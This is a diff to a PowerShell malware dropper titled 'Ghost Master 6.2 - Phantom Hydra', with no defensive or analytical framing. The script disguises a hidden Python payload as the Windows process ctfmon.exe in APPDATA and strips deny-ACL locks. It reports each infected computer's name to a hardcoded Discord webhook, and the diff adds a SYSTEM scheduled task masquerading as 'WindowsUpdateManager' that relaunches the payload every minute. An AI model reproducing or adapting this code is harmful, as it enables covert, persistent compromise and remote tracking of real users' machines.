@@ -1,4 +1,4 @@
-# --- THE GHOST MASTER (VERSION 6.1 - PHANTOM HYDRA) ---
+# --- THE GHOST MASTER (VERSION 6.2 - PHANTOM HYDRA) ---
 $WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
 function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }
 
@@ -7,13 +7,12 @@ $Path = "$env:APPDATA\$ID"
 $PY_MASK = "$Path\python\ctfmon.exe"
 
 # --- STEP 0: THE GHOST CHECK (Idempotency) ---
-# If the engine is already running, we exit SILENTLY. No noise, no Discord spam.
 if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) {
     exit
 }
 
-# If the engine isn't running but the files ARE there, we just start it and exit.
 if (Test-Path $PY_MASK) {
+    $env:PYTHONPATH = "$Path\python\Lib\site-packages"
     Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
     Send-Ghost "Hydra Re-Engaged from Disk on $($env:COMPUTERNAME)"
     exit
@@ -25,7 +24,6 @@ Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"
 
 # 1. Clear & Exclusion (THE LOCK-BREAKER)
 if (Test-Path $Path) { 
-    # We strip the "Deny" locks first so we can actually clean/update
     try {
         $Acl = Get-Acl $Path
         $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
@@ -77,21 +75,18 @@ if (Test-Path "$Path\UpdataData.bin") {
     } catch {}
 }
 
-# 5. ACTIVATION & RESURRECTION TASK
+# 5. ACTIVATION & RESURRECTION TASK (THE "OLD SCHOOL" HYDRA)
 if (Test-Path "$Path\python\pythonw.exe") {
     Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
     
-    # Register the Resurrection Task (Auto-wake every 1 min)
-    $Action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName "WindowsUpdateManager" -Action $Action -Trigger $Trigger -User "NT AUTHORITY\INTERACTIVE" -Force
-    $Task = Get-ScheduledTask -TaskName "WindowsUpdateManager"
-    $Task.Triggers[0].Repetition = (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
-    Set-ScheduledTask -InputObject $Task -Force
+    # Register the Resurrection Task as SYSTEM for maximum power
+    # This runs every 1 minute and is 100% silent
+    $TaskCommand = "schtasks /create /tn `"WindowsUpdateManager`" /tr `"$PY_MASK `"$Path\WinServices.py`" --id $ID`" /sc minute /mo 1 /ru `"SYSTEM`" /f"
+    Invoke-Expression $TaskCommand
 
     $env:PYTHONPATH = $LibPath
     Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
-    Send-Ghost "Hydra Released. Resurrection Task Active."
+    Send-Ghost "Hydra Released. Resurrection Task Active (Old School Mode)."
 }
 
 # CLEANUP
